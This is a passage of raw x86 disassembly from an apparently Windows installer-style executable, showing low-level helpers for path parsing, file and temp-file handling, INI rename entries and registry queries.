  405ec1:	66 3b 4c 24 08       	cmp    0x8(%esp),%cx
  405ec6:	74 0f                	je     0x405ed7
  405ec8:	50                   	push   %eax
  405ec9:	ff 15 08 82 40 00    	call   *0x408208
  405ecf:	66 8b 08             	mov    (%eax),%cx
  405ed2:	66 85 c9             	test   %cx,%cx
  405ed5:	75 ea                	jne    0x405ec1
  405ed7:	c2 08 00             	ret    $0x8
  405eda:	56                   	push   %esi
  405edb:	8b 74 24 08          	mov    0x8(%esp),%esi
  405edf:	56                   	push   %esi
  405ee0:	e8 f0 06 00 00       	call   0x4065d5
  405ee5:	8d 04 46             	lea    (%esi,%eax,2),%eax
  405ee8:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  405eec:	74 0c                	je     0x405efa
  405eee:	50                   	push   %eax
  405eef:	56                   	push   %esi
  405ef0:	ff 15 fc 81 40 00    	call   *0x4081fc
  405ef6:	3b c6                	cmp    %esi,%eax
  405ef8:	77 ee                	ja     0x405ee8
  405efa:	66 83 20 00          	andw   $0x0,(%eax)
  405efe:	83 c0 02             	add    $0x2,%eax
  405f01:	5e                   	pop    %esi
  405f02:	c2 04 00             	ret    $0x4
  405f05:	8b 54 24 04          	mov    0x4(%esp),%edx
  405f09:	66 8b 0a             	mov    (%edx),%cx
  405f0c:	8b c1                	mov    %ecx,%eax
  405f0e:	0c 20                	or     $0x20,%al
  405f10:	66 83 f9 5c          	cmp    $0x5c,%cx
  405f14:	75 06                	jne    0x405f1c
  405f16:	66 39 4a 02          	cmp    %cx,0x2(%edx)
  405f1a:	74 13                	je     0x405f2f
  405f1c:	66 3d 61 00          	cmp    $0x61,%ax
  405f20:	72 12                	jb     0x405f34
  405f22:	66 3d 7a 00          	cmp    $0x7a,%ax
  405f26:	77 0c                	ja     0x405f34
  405f28:	66 83 7a 02 3a       	cmpw   $0x3a,0x2(%edx)
  405f2d:	75 05                	jne    0x405f34
  405f2f:	33 c0                	xor    %eax,%eax
  405f31:	40                   	inc    %eax
  405f32:	eb 02                	jmp    0x405f36
  405f34:	33 c0                	xor    %eax,%eax
  405f36:	c2 04 00             	ret    $0x4
  405f39:	53                   	push   %ebx
  405f3a:	56                   	push   %esi
  405f3b:	8b 35 08 82 40 00    	mov    0x408208,%esi
  405f41:	57                   	push   %edi
  405f42:	8b 7c 24 10          	mov    0x10(%esp),%edi
  405f46:	57                   	push   %edi
  405f47:	ff d6                	call   *%esi
  405f49:	8b d8                	mov    %eax,%ebx
  405f4b:	53                   	push   %ebx
  405f4c:	ff d6                	call   *%esi
  405f4e:	66 8b 0f             	mov    (%edi),%cx
  405f51:	66 85 c9             	test   %cx,%cx
  405f54:	74 12                	je     0x405f68
  405f56:	66 83 3b 3a          	cmpw   $0x3a,(%ebx)
  405f5a:	75 0c                	jne    0x405f68
  405f5c:	66 83 7b 02 5c       	cmpw   $0x5c,0x2(%ebx)
  405f61:	75 05                	jne    0x405f68
  405f63:	50                   	push   %eax
  405f64:	ff d6                	call   *%esi
  405f66:	eb 28                	jmp    0x405f90
  405f68:	66 83 f9 5c          	cmp    $0x5c,%cx
  405f6c:	75 20                	jne    0x405f8e
  405f6e:	66 39 4f 02          	cmp    %cx,0x2(%edi)
  405f72:	75 1a                	jne    0x405f8e
  405f74:	6a 02                	push   $0x2
  405f76:	5e                   	pop    %esi
  405f77:	6a 5c                	push   $0x5c
  405f79:	50                   	push   %eax
  405f7a:	4e                   	dec    %esi
  405f7b:	e8 3b ff ff ff       	call   0x405ebb
  405f80:	66 83 38 00          	cmpw   $0x0,(%eax)
  405f84:	74 08                	je     0x405f8e
  405f86:	40                   	inc    %eax
  405f87:	40                   	inc    %eax
  405f88:	85 f6                	test   %esi,%esi
  405f8a:	75 eb                	jne    0x405f77
  405f8c:	eb 02                	jmp    0x405f90
  405f8e:	33 c0                	xor    %eax,%eax
  405f90:	5f                   	pop    %edi
  405f91:	5e                   	pop    %esi
  405f92:	5b                   	pop    %ebx
  405f93:	c2 04 00             	ret    $0x4
  405f96:	56                   	push   %esi
  405f97:	57                   	push   %edi
  405f98:	ff 74 24 0c          	push   0xc(%esp)
  405f9c:	be 70 f2 42 00       	mov    $0x42f270,%esi
  405fa1:	56                   	push   %esi
  405fa2:	e8 18 06 00 00       	call   0x4065bf
  405fa7:	56                   	push   %esi
  405fa8:	e8 8c ff ff ff       	call   0x405f39
  405fad:	8b f8                	mov    %eax,%edi
  405faf:	85 ff                	test   %edi,%edi
  405fb1:	75 04                	jne    0x405fb7
  405fb3:	33 c0                	xor    %eax,%eax
  405fb5:	eb 58                	jmp    0x40600f
  405fb7:	57                   	push   %edi
  405fb8:	e8 b0 08 00 00       	call   0x40686d
  405fbd:	f6 05 18 47 43 00 80 	testb  $0x80,0x434718
  405fc4:	74 0e                	je     0x405fd4
  405fc6:	66 8b 07             	mov    (%edi),%ax
  405fc9:	66 85 c0             	test   %ax,%ax
  405fcc:	74 e5                	je     0x405fb3
  405fce:	66 3d 5c 00          	cmp    $0x5c,%ax
  405fd2:	74 df                	je     0x405fb3
  405fd4:	2b fe                	sub    %esi,%edi
  405fd6:	d1 ff                	sar    $1,%edi
  405fd8:	eb 14                	jmp    0x405fee
  405fda:	e8 3d 09 00 00       	call   0x40691c
  405fdf:	85 c0                	test   %eax,%eax
  405fe1:	74 05                	je     0x405fe8
  405fe3:	f6 00 10             	testb  $0x10,(%eax)
  405fe6:	74 cb                	je     0x405fb3
  405fe8:	56                   	push   %esi
  405fe9:	e8 ec fe ff ff       	call   0x405eda
  405fee:	56                   	push   %esi
  405fef:	e8 e1 05 00 00       	call   0x4065d5
  405ff4:	3b c7                	cmp    %edi,%eax
  405ff6:	56                   	push   %esi
  405ff7:	7f e1                	jg     0x405fda
  405ff9:	e8 90 fe ff ff       	call   0x405e8e
  405ffe:	56                   	push   %esi
  405fff:	ff 15 dc 80 40 00    	call   *0x4080dc
  406005:	33 c9                	xor    %ecx,%ecx
  406007:	83 f8 ff             	cmp    $0xffffffff,%eax
  40600a:	0f 95 c1             	setne  %cl
  40600d:	8b c1                	mov    %ecx,%eax
  40600f:	5f                   	pop    %edi
  406010:	5e                   	pop    %esi
  406011:	c2 04 00             	ret    $0x4
  406014:	55                   	push   %ebp
  406015:	8b ec                	mov    %esp,%ebp
  406017:	51                   	push   %ecx
  406018:	53                   	push   %ebx
  406019:	56                   	push   %esi
  40601a:	57                   	push   %edi
  40601b:	8b 3d 28 81 40 00    	mov    0x408128,%edi
  406021:	ff 75 0c             	push   0xc(%ebp)
  406024:	ff d7                	call   *%edi
  406026:	8b 75 08             	mov    0x8(%ebp),%esi
  406029:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40602c:	eb 27                	jmp    0x406055
  40602e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406031:	ff 75 0c             	push   0xc(%ebp)
  406034:	8a 1c 30             	mov    (%eax,%esi,1),%bl
  406037:	80 24 30 00          	andb   $0x0,(%eax,%esi,1)
  40603b:	56                   	push   %esi
  40603c:	ff 15 6c 80 40 00    	call   *0x40806c
  406042:	85 c0                	test   %eax,%eax
  406044:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406047:	88 1c 30             	mov    %bl,(%eax,%esi,1)
  40604a:	74 1a                	je     0x406066
  40604c:	56                   	push   %esi
  40604d:	ff 15 74 82 40 00    	call   *0x408274
  406053:	8b f0                	mov    %eax,%esi
  406055:	56                   	push   %esi
  406056:	ff d7                	call   *%edi
  406058:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  40605b:	7d d1                	jge    0x40602e
  40605d:	33 c0                	xor    %eax,%eax
  40605f:	5f                   	pop    %edi
  406060:	5e                   	pop    %esi
  406061:	5b                   	pop    %ebx
  406062:	c9                   	leave
  406063:	c2 08 00             	ret    $0x8
  406066:	8b c6                	mov    %esi,%eax
  406068:	eb f5                	jmp    0x40605f
  40606a:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40606e:	56                   	push   %esi
  40606f:	8b 74 24 10          	mov    0x10(%esp),%esi
  406073:	85 f6                	test   %esi,%esi
  406075:	76 0f                	jbe    0x406086
  406077:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40607b:	2b c1                	sub    %ecx,%eax
  40607d:	8a 14 08             	mov    (%eax,%ecx,1),%dl
  406080:	88 11                	mov    %dl,(%ecx)
  406082:	41                   	inc    %ecx
  406083:	4e                   	dec    %esi
  406084:	75 f7                	jne    0x40607d
  406086:	5e                   	pop    %esi
  406087:	c2 0c 00             	ret    $0xc
  40608a:	56                   	push   %esi
  40608b:	ff 74 24 08          	push   0x8(%esp)
  40608f:	ff 15 dc 80 40 00    	call   *0x4080dc
  406095:	8b f0                	mov    %eax,%esi
  406097:	83 fe ff             	cmp    $0xffffffff,%esi
  40609a:	74 0d                	je     0x4060a9
  40609c:	24 fe                	and    $0xfe,%al
  40609e:	50                   	push   %eax
  40609f:	ff 74 24 0c          	push   0xc(%esp)
  4060a3:	ff 15 d8 80 40 00    	call   *0x4080d8
  4060a9:	8b c6                	mov    %esi,%eax
  4060ab:	5e                   	pop    %esi
  4060ac:	c2 04 00             	ret    $0x4
  4060af:	ff 74 24 04          	push   0x4(%esp)
  4060b3:	ff 15 dc 80 40 00    	call   *0x4080dc
  4060b9:	8b c8                	mov    %eax,%ecx
  4060bb:	6a 00                	push   $0x0
  4060bd:	41                   	inc    %ecx
  4060be:	f7 d9                	neg    %ecx
  4060c0:	1b c9                	sbb    %ecx,%ecx
  4060c2:	23 c8                	and    %eax,%ecx
  4060c4:	51                   	push   %ecx
  4060c5:	ff 74 24 14          	push   0x14(%esp)
  4060c9:	6a 00                	push   $0x0
  4060cb:	6a 01                	push   $0x1
  4060cd:	ff 74 24 1c          	push   0x1c(%esp)
  4060d1:	ff 74 24 1c          	push   0x1c(%esp)
  4060d5:	ff 15 70 80 40 00    	call   *0x408070
  4060db:	c2 0c 00             	ret    $0xc
  4060de:	55                   	push   %ebp
  4060df:	8b ec                	mov    %esp,%ebp
  4060e1:	51                   	push   %ecx
  4060e2:	51                   	push   %ecx
  4060e3:	56                   	push   %esi
  4060e4:	8b 75 08             	mov    0x8(%ebp),%esi
  4060e7:	57                   	push   %edi
  4060e8:	6a 64                	push   $0x64
  4060ea:	5f                   	pop    %edi
  4060eb:	a1 78 a5 40 00       	mov    0x40a578,%eax
  4060f0:	4f                   	dec    %edi
  4060f1:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4060f4:	a1 7c a5 40 00       	mov    0x40a57c,%eax
  4060f9:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4060fc:	ff 15 d0 80 40 00    	call   *0x4080d0
  406102:	6a 1a                	push   $0x1a
  406104:	33 d2                	xor    %edx,%edx
  406106:	59                   	pop    %ecx
  406107:	f7 f1                	div    %ecx
  406109:	56                   	push   %esi
  40610a:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40610d:	6a 00                	push   $0x0
  40610f:	50                   	push   %eax
  406110:	ff 75 0c             	push   0xc(%ebp)
  406113:	66 01 55 fc          	add    %dx,-0x4(%ebp)
  406117:	ff 15 74 80 40 00    	call   *0x408074
  40611d:	85 c0                	test   %eax,%eax
  40611f:	75 0d                	jne    0x40612e
  406121:	85 ff                	test   %edi,%edi
  406123:	75 c6                	jne    0x4060eb
  406125:	66 21 3e             	and    %di,(%esi)
  406128:	5f                   	pop    %edi
  406129:	5e                   	pop    %esi
  40612a:	c9                   	leave
  40612b:	c2 08 00             	ret    $0x8
  40612e:	8b c6                	mov    %esi,%eax
  406130:	eb f6                	jmp    0x406128
  406132:	55                   	push   %ebp
  406133:	8b ec                	mov    %esp,%ebp
  406135:	56                   	push   %esi
  406136:	8b 75 10             	mov    0x10(%ebp),%esi
  406139:	8d 45 10             	lea    0x10(%ebp),%eax
  40613c:	6a 00                	push   $0x0
  40613e:	50                   	push   %eax
  40613f:	56                   	push   %esi
  406140:	ff 75 0c             	push   0xc(%ebp)
  406143:	ff 75 08             	push   0x8(%ebp)
  406146:	ff 15 30 81 40 00    	call   *0x408130
  40614c:	85 c0                	test   %eax,%eax
  40614e:	74 0a                	je     0x40615a
  406150:	3b 75 10             	cmp    0x10(%ebp),%esi
  406153:	75 05                	jne    0x40615a
  406155:	33 c0                	xor    %eax,%eax
  406157:	40                   	inc    %eax
  406158:	eb 02                	jmp    0x40615c
  40615a:	33 c0                	xor    %eax,%eax
  40615c:	5e                   	pop    %esi
  40615d:	5d                   	pop    %ebp
  40615e:	c2 0c 00             	ret    $0xc
  406161:	55                   	push   %ebp
  406162:	8b ec                	mov    %esp,%ebp
  406164:	56                   	push   %esi
  406165:	8b 75 10             	mov    0x10(%ebp),%esi
  406168:	8d 45 10             	lea    0x10(%ebp),%eax
  40616b:	6a 00                	push   $0x0
  40616d:	50                   	push   %eax
  40616e:	56                   	push   %esi
  40616f:	ff 75 0c             	push   0xc(%ebp)
  406172:	ff 75 08             	push   0x8(%ebp)
  406175:	ff 15 b8 80 40 00    	call   *0x4080b8
  40617b:	85 c0                	test   %eax,%eax
  40617d:	74 0a                	je     0x406189
  40617f:	3b 75 10             	cmp    0x10(%ebp),%esi
  406182:	75 05                	jne    0x406189
  406184:	33 c0                	xor    %eax,%eax
  406186:	40                   	inc    %eax
  406187:	eb 02                	jmp    0x40618b
  406189:	33 c0                	xor    %eax,%eax
  40618b:	5e                   	pop    %esi
  40618c:	5d                   	pop    %ebp
  40618d:	c2 0c 00             	ret    $0xc
  406190:	55                   	push   %ebp
  406191:	8b ec                	mov    %esp,%ebp
  406193:	53                   	push   %ebx
  406194:	8b 5d 08             	mov    0x8(%ebp),%ebx
  406197:	56                   	push   %esi
  406198:	8b 35 34 81 40 00    	mov    0x408134,%esi
  40619e:	57                   	push   %edi
  40619f:	33 ff                	xor    %edi,%edi
  4061a1:	6a 01                	push   $0x1
  4061a3:	57                   	push   %edi
  4061a4:	57                   	push   %edi
  4061a5:	53                   	push   %ebx
  4061a6:	ff d6                	call   *%esi
  4061a8:	85 c0                	test   %eax,%eax
  4061aa:	75 4f                	jne    0x4061fb
  4061ac:	8d 45 0a             	lea    0xa(%ebp),%eax
  4061af:	6a 02                	push   $0x2
  4061b1:	50                   	push   %eax
  4061b2:	53                   	push   %ebx
  4061b3:	e8 7a ff ff ff       	call   0x406132
  4061b8:	85 c0                	test   %eax,%eax
  4061ba:	74 0c                	je     0x4061c8
  4061bc:	66 81 7d 0a ff fe    	cmpw   $0xfeff,0xa(%ebp)
  4061c2:	75 04                	jne    0x4061c8
  4061c4:	33 c0                	xor    %eax,%eax
  4061c6:	eb 36                	jmp    0x4061fe
  4061c8:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  4061cb:	74 28                	je     0x4061f5
  4061cd:	6a 01                	push   $0x1
  4061cf:	57                   	push   %edi
  4061d0:	57                   	push   %edi
  4061d1:	53                   	push   %ebx
  4061d2:	ff d6                	call   *%esi
  4061d4:	85 c0                	test   %eax,%eax
  4061d6:	75 1d                	jne    0x4061f5
  4061d8:	6a 02                	push   $0x2
  4061da:	68 14 84 40 00       	push   $0x408414
  4061df:	53                   	push   %ebx
  4061e0:	e8 7c ff ff ff       	call   0x406161
  4061e5:	f7 d8                	neg    %eax
  4061e7:	1b c0                	sbb    %eax,%eax
  4061e9:	25 fb bf ff 7f       	and    $0x7fffbffb,%eax
  4061ee:	05 05 40 00 80       	add    $0x80004005,%eax
  4061f3:	eb 09                	jmp    0x4061fe
  4061f5:	57                   	push   %edi
  4061f6:	57                   	push   %edi
  4061f7:	57                   	push   %edi
  4061f8:	53                   	push   %ebx
  4061f9:	ff d6                	call   *%esi
  4061fb:	33 c0                	xor    %eax,%eax
  4061fd:	40                   	inc    %eax
  4061fe:	5f                   	pop    %edi
  4061ff:	5e                   	pop    %esi
  406200:	5b                   	pop    %ebx
  406201:	5d                   	pop    %ebp
  406202:	c2 08 00             	ret    $0x8
  406205:	53                   	push   %ebx
  406206:	8b 1d ec 80 40 00    	mov    0x4080ec,%ebx
  40620c:	55                   	push   %ebp
  40620d:	56                   	push   %esi
  40620e:	8b 74 24 14          	mov    0x14(%esp),%esi
  406212:	57                   	push   %edi
  406213:	85 f6                	test   %esi,%esi
  406215:	c7 05 08 01 43 00 4e 	movl   $0x55004e,0x430108
  40621c:	00 55 00 
  40621f:	c7 05 0c 01 43 00 4c 	movl   $0x4c,0x43010c
  406226:	00 00 00 
  406229:	bf 00 04 00 00       	mov    $0x400,%edi
  40622e:	bd 08 01 43 00       	mov    $0x430108,%ebp
  406233:	74 26                	je     0x40625b
  406235:	6a 01                	push   $0x1
  406237:	6a 00                	push   $0x0
  406239:	56                   	push   %esi
  40623a:	e8 70 fe ff ff       	call   0x4060af
  40623f:	50                   	push   %eax
  406240:	ff 15 fc 80 40 00    	call   *0x4080fc
  406246:	57                   	push   %edi
  406247:	55                   	push   %ebp
  406248:	56                   	push   %esi
  406249:	ff d3                	call   *%ebx
  40624b:	85 c0                	test   %eax,%eax
  40624d:	0f 84 27 01 00 00    	je     0x40637a
  406253:	3b c7                	cmp    %edi,%eax
  406255:	0f 8f 1f 01 00 00    	jg     0x40637a
  40625b:	be 08 09 43 00       	mov    $0x430908,%esi
  406260:	57                   	push   %edi
  406261:	56                   	push   %esi
  406262:	ff 74 24 1c          	push   0x1c(%esp)
  406266:	ff d3                	call   *%ebx
  406268:	85 c0                	test   %eax,%eax
  40626a:	0f 84 0a 01 00 00    	je     0x40637a
  406270:	3b c7                	cmp    %edi,%eax
  406272:	0f 8f 02 01 00 00    	jg     0x40637a
  406278:	56                   	push   %esi
  406279:	55                   	push   %ebp
  40627a:	68 90 a5 40 00       	push   $0x40a590
  40627f:	68 08 fd 42 00       	push   $0x42fd08
  406284:	ff 15 78 82 40 00    	call   *0x408278
  40628a:	8b d8                	mov    %eax,%ebx
  40628c:	a1 10 47 43 00       	mov    0x434710,%eax
  406291:	83 c4 10             	add    $0x10,%esp
  406294:	ff b0 28 01 00 00    	push   0x128(%eax)
  40629a:	56                   	push   %esi
  40629b:	e8 5c 03 00 00       	call   0x4065fc
  4062a0:	6a 04                	push   $0x4
  4062a2:	68 00 00 00 c0       	push   $0xc0000000
  4062a7:	56                   	push   %esi
  4062a8:	e8 02 fe ff ff       	call   0x4060af
  4062ad:	8b e8                	mov    %eax,%ebp
  4062af:	83 fd ff             	cmp    $0xffffffff,%ebp
  4062b2:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  4062b6:	0f 84 be 00 00 00    	je     0x40637a
  4062bc:	6a 00                	push   $0x0
  4062be:	55                   	push   %ebp
  4062bf:	ff 15 cc 80 40 00    	call   *0x4080cc
  4062c5:	8b f8                	mov    %eax,%edi
  4062c7:	8d 44 1f 0a          	lea    0xa(%edi,%ebx,1),%eax
  4062cb:	50                   	push   %eax
  4062cc:	6a 40                	push   $0x40
  4062ce:	ff 15 10 81 40 00    	call   *0x408110
  4062d4:	8b f0                	mov    %eax,%esi
  4062d6:	85 f6                	test   %esi,%esi
  4062d8:	0f 84 95 00 00 00    	je     0x406373
  4062de:	57                   	push   %edi
  4062df:	56                   	push   %esi
  4062e0:	55                   	push   %ebp
  4062e1:	e8 4c fe ff ff       	call   0x406132
  4062e6:	85 c0                	test   %eax,%eax
  4062e8:	0f 84 85 00 00 00    	je     0x406373
  4062ee:	68 84 a5 40 00       	push   $0x40a584
  4062f3:	56                   	push   %esi
  4062f4:	e8 1b fd ff ff       	call   0x406014
  4062f9:	85 c0                	test   %eax,%eax
  4062fb:	75 14                	jne    0x406311
  4062fd:	8d 04 3e             	lea    (%esi,%edi,1),%eax
  406300:	68 84 a5 40 00       	push   $0x40a584
  406305:	50                   	push   %eax
  406306:	ff 15 4c 81 40 00    	call   *0x40814c
  40630c:	83 c7 0a             	add    $0xa,%edi
  40630f:	eb 35                	jmp    0x406346
  406311:	83 c0 0a             	add    $0xa,%eax
  406314:	68 80 a5 40 00       	push   $0x40a580
  406319:	50                   	push   %eax
  40631a:	e8 f5 fc ff ff       	call   0x406014
  40631f:	8b e8                	mov    %eax,%ebp
  406321:	85 ed                	test   %ebp,%ebp
  406323:	74 1d                	je     0x406342
  406325:	8d 0c 3e             	lea    (%esi,%edi,1),%ecx
  406328:	8d 04 19             	lea    (%ecx,%ebx,1),%eax
  40632b:	eb 06                	jmp    0x406333
  40632d:	8a 11                	mov    (%ecx),%dl
  40632f:	88 10                	mov    %dl,(%eax)
  406331:	48                   	dec    %eax
  406332:	49                   	dec    %ecx
  406333:	3b cd                	cmp    %ebp,%ecx
  406335:	77 f6                	ja     0x40632d
  406337:	2b ee                	sub    %esi,%ebp
  406339:	45                   	inc    %ebp
  40633a:	8b c5                	mov    %ebp,%eax
  40633c:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  406340:	eb 06                	jmp    0x406348
  406342:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  406346:	8b c7                	mov    %edi,%eax
  406348:	53                   	push   %ebx
  406349:	03 c6                	add    %esi,%eax
  40634b:	68 08 fd 42 00       	push   $0x42fd08
  406350:	50                   	push   %eax
  406351:	e8 14 fd ff ff       	call   0x40606a
  406356:	33 c0                	xor    %eax,%eax
  406358:	50                   	push   %eax
  406359:	50                   	push   %eax
  40635a:	50                   	push   %eax
  40635b:	55                   	push   %ebp
  40635c:	ff 15 34 81 40 00    	call   *0x408134
  406362:	03 fb                	add    %ebx,%edi
  406364:	57                   	push   %edi
  406365:	56                   	push   %esi
  406366:	55                   	push   %ebp
  406367:	e8 f5 fd ff ff       	call   0x406161
  40636c:	56                   	push   %esi
  40636d:	ff 15 0c 81 40 00    	call   *0x40810c
  406373:	55                   	push   %ebp
  406374:	ff 15 fc 80 40 00    	call   *0x4080fc
  40637a:	5f                   	pop    %edi
  40637b:	5e                   	pop    %esi
  40637c:	5d                   	pop    %ebp
  40637d:	5b                   	pop    %ebx
  40637e:	c3                   	ret
  40637f:	6a 05                	push   $0x5
  406381:	ff 74 24 0c          	push   0xc(%esp)
  406385:	ff 74 24 0c          	push   0xc(%esp)
  406389:	ff 15 50 81 40 00    	call   *0x408150
  40638f:	85 c0                	test   %eax,%eax
  406391:	75 0f                	jne    0x4063a2
  406393:	ff 74 24 08          	push   0x8(%esp)
  406397:	ff 74 24 08          	push   0x8(%esp)
  40639b:	e8 65 fe ff ff       	call   0x406205
  4063a0:	59                   	pop    %ecx
  4063a1:	59                   	pop    %ecx
  4063a2:	ff 05 90 47 43 00    	incl   0x434790
  4063a8:	c2 08 00             	ret    $0x8
  4063ab:	53                   	push   %ebx
  4063ac:	33 db                	xor    %ebx,%ebx
  4063ae:	38 1d bc 47 43 00    	cmp    %bl,0x4347bc
  4063b4:	56                   	push   %esi
  4063b5:	8b 74 24 10          	mov    0x10(%esp),%esi
  4063b9:	57                   	push   %edi
  4063ba:	0f 9c c3             	setl   %bl
  4063bd:	8b 06                	mov    (%esi),%eax
  4063bf:	8b 7c 24 10          	mov    0x10(%esp),%edi
  4063c3:	f7 db                	neg    %ebx
  4063c5:	1b db                	sbb    %ebx,%ebx
  4063c7:	32 db                	xor    %bl,%bl
  4063c9:	81 c3 00 01 00 00    	add    $0x100,%ebx
  4063cf:	a8 20                	test   $0x20,%al
  4063d1:	74 32                	je     0x406405
  4063d3:	f7 c7 00 00 00 60    	test   $0x60000000,%edi
  4063d9:	74 2a                	je     0x406405
  4063db:	8b cf                	mov    %edi,%ecx
  4063dd:	ba 00 03 00 00       	mov    $0x300,%edx
  4063e2:	c1 e9 15             	shr    $0x15,%ecx
  4063e5:	23 ca                	and    %edx,%ecx
  4063e7:	3b ca                	cmp    %edx,%ecx
  4063e9:	75 0a                	jne    0x4063f5
  4063eb:	8b cb                	mov    %ebx,%ecx
  4063ed:	f7 d1                	not    %ecx
  4063ef:	23 0d b0 47 43 00    	and    0x4347b0,%ecx
  4063f5:	80 e4 fe             	and    $0xfe,%ah
  4063f8:	0b c1                	or     %ecx,%eax
  4063fa:	80 e4 fd             	and    $0xfd,%ah
  4063fd:	81 e7 ff ff ff 9f    	and    $0x9fffffff,%edi
  406403:	eb 0d                	jmp    0x406412
  406405:	a9 00 00 10 00       	test   $0x100000,%eax
  40640a:	74 06                	je     0x406412
  40640c:	0b 05 b0 47 43 00    	or     0x4347b0,%eax
  406412:	8b c8                	mov    %eax,%ecx
  406414:	23 c3                	and    %ebx,%eax
  406416:	81 e1 df ff ef ff    	and    $0xffefffdf,%ecx
  40641c:	f7 d8                	neg    %eax
  40641e:	1b c0                	sbb    %eax,%eax
  406420:	89 0e                	mov    %ecx,(%esi)
  406422:	f7 d0                	not    %eax
  406424:	23 c7                	and    %edi,%eax
  406426:	5f                   	pop    %edi
  406427:	5e                   	pop    %esi
  406428:	5b                   	pop    %ebx
  406429:	c2 08 00             	ret    $0x8
  40642c:	55                   	push   %ebp
  40642d:	8b ec                	mov    %esp,%ebp
  40642f:	8d 45 10             	lea    0x10(%ebp),%eax
  406432:	50                   	push   %eax
  406433:	ff 75 08             	push   0x8(%ebp)
  406436:	e8 70 ff ff ff       	call   0x4063ab
  40643b:	85 c0                	test   %eax,%eax
  40643d:	75 05                	jne    0x406444
  40643f:	6a 06                	push   $0x6
  406441:	58                   	pop    %eax
  406442:	eb 12                	jmp    0x406456
  406444:	ff 75 14             	push   0x14(%ebp)
  406447:	ff 75 10             	push   0x10(%ebp)
  40644a:	6a 00                	push   $0x0
  40644c:	ff 75 0c             	push   0xc(%ebp)
  40644f:	50                   	push   %eax
  406450:	ff 15 28 80 40 00    	call   *0x408028
  406456:	5d                   	pop    %ebp
  406457:	c2 10 00             	ret    $0x10
  40645a:	55                   	push   %ebp
  40645b:	8b ec                	mov    %esp,%ebp
  40645d:	8d 45 10             	lea    0x10(%ebp),%eax
  406460:	50                   	push   %eax
  406461:	ff 75 08             	push   0x8(%ebp)
  406464:	e8 42 ff ff ff       	call   0x4063ab
  406469:	33 c9                	xor    %ecx,%ecx
  40646b:	3b c1                	cmp    %ecx,%eax
  40646d:	75 05                	jne    0x406474
  40646f:	6a 06                	push   $0x6
  406471:	58                   	pop    %eax
  406472:	eb 15                	jmp    0x406489
  406474:	51                   	push   %ecx
  406475:	ff 75 14             	push   0x14(%ebp)
  406478:	51                   	push   %ecx
  406479:	ff 75 10             	push   0x10(%ebp)
  40647c:	51                   	push   %ecx
  40647d:	51                   	push   %ecx
  40647e:	51                   	push   %ecx
  40647f:	ff 75 0c             	push   0xc(%ebp)
  406482:	50                   	push   %eax
  406483:	ff 15 2c 80 40 00    	call   *0x40802c
  406489:	5d                   	pop    %ebp
  40648a:	c2 10 00             	ret    $0x10
  40648d:	55                   	push   %ebp
  40648e:	8b ec                	mov    %esp,%ebp
  406490:	51                   	push   %ecx
  406491:	8d 45 18             	lea    0x18(%ebp),%eax
  406494:	56                   	push   %esi
  406495:	50                   	push   %eax
  406496:	8b 45 18             	mov    0x18(%ebp),%eax
  406499:	f7 d8                	neg    %eax
  40649b:	1b c0                	sbb    %eax,%eax
  40649d:	c7 45 fc 00 08 00 00 	movl   $0x800,-0x4(%ebp)
  4064a4:	25 00 01 00 00       	and    $0x100,%eax
  4064a9:	0d 19 00 02 00       	or     $0x20019,%eax
  4064ae:	50                   	push   %eax
  4064af:	ff 75 0c             	push   0xc(%ebp)
  4064b2:	ff 75 08             	push   0x8(%ebp)
  4064b5:	e8 72 ff ff ff       	call   0x40642c
  4064ba:	8b 75 14             	mov    0x14(%ebp),%esi
  4064bd:	85 c0                	test   %eax,%eax
  4064bf:	75 3c                	jne    0x4064fd
  4064c1:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4064c4:	57                   	push   %edi
  4064c5:	50                   	push   %eax
  4064c6:	8d 45 0c             	lea    0xc(%ebp),%eax
  4064c9:	56                   	push   %esi
  4064ca:	50                   	push   %eax
  4064cb:	6a 00                	push   $0x0
  4064cd:	ff 75 10             	push   0x10(%ebp)
  4064d0:	ff 75 18             	push   0x18(%ebp)
  4064d3:	ff 15 08 80 40 00    	call   *0x408008
  4064d9:	ff 75 18             	push   0x18(%ebp)
  4064dc:	8b f8                	mov    %eax,%edi
  4064de:	ff 15 10 80 40 00    	call   *0x408010
  4064e4:	66 83 a6 fe 07 00 00 	andw   $0x0,0x7fe(%esi)
  4064eb:	00 
  4064ec:	85 ff                	test   %edi,%edi
  4064ee:	5f                   	pop    %edi
  4064ef:	75 0c                	jne    0x4064fd
  4064f1:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  4064f5:	74 0a                	je     0x406501
  4064f7:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  4064fb:	74 04                	je     0x406501
  4064fd:	66 83 26 00          	andw   $0x0,(%esi)
  406501:	5e                   	pop    %esi
  406502:	c9                   	leave
  406503:	c2 14 00             	ret    $0x14
  406506:	ff 74 24 08          	push   0x8(%esp)
  40650a:	68 18 84 40 00       	push   $0x408418
  40650f:	ff 74 24 0c          	push   0xc(%esp)
  406513:	ff 15 2c 82 40 00    	call   *0x40822c
  406519:	83 c4 0c             	add    $0xc,%esp
  40651c:	c2 08 00             	ret    $0x8
  40651f:	55                   	push   %ebp
  406520:	8b ec                	mov    %esp,%ebp
  406522:	51                   	push   %ecx
  406523:	51                   	push   %ecx
  406524:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406527:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40652b:	53                   	push   %ebx
  40652c:	56                   	push   %esi
  40652d:	66 83 39 2d          	cmpw   $0x2d,(%ecx)
  406531:	6a 0a                	push   $0xa
  406533:	58                   	pop    %eax
  406534:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  40653b:	6a 39                	push   $0x39
  40653d:	5b                   	pop    %ebx
  40653e:	75 06                	jne    0x406546
  406540:	41                   	inc    %ecx
